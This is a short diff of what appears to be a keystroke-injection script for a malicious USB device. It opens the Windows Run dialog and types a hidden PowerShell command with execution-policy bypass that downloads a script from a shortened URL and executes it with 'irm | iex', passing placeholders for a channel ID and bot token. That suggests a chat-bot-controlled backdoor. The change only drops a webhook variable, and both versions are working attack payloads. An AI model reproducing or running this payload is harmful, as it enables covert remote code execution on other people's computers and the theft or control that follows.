@@ -12,5 +12,5 @@ layout("us")
 delay(1000);
 press("GUI r");
 delay(1000);
-type("powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex");
+type("powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex");
 press("ENTER");
